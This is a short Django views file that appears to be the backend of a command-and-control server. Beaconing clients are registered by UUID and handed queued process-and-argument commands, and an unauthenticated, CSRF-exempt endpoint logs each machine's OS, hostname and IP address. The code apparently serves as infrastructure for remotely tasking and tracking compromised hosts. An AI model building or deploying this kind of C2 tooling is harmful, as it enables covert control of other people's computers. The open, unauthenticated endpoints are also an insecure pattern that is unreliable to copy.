from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from .models import *
import json
from django.views.decorators.csrf import csrf_exempt

def clientTest(request):
    return HttpResponse(request.META['REMOTE_ADDR'])

def commands(request, uuid):
    if client.objects.filter(uuid=uuid):
        print("EXISTS")
    else:
        new = client(uuid=uuid)
        new.save()
        new.commands.create(process="UPDATE", arguments="")

    beaconedClient = client.objects.filter(uuid=uuid)[0]
    try:
        commandResponse = beaconedClient.commands.all()[0]
    except:
        commandResponse = ""
    response_data = {}
    if commandResponse:
        response_data['command'] = commandResponse.process
        response_data['args'] = commandResponse.arguments
        beaconedClient.commands.remove(commandResponse)
    else:
        print("NO COMMANDS")
    return HttpResponse(json.dumps(response_data), content_type="application/json")

@csrf_exempt
def update(request):
    uuid = request.POST["UUID"]
    os = request.POST["OS"]
    hostname = request.POST["HOSTNAME"]
    current_client = client.objects.get(uuid=uuid)
    current_client.os = os
    current_client.hostname = hostname
    current_client.ip = request.META['REMOTE_ADDR'] 
    current_client.save()
    return HttpResponse()
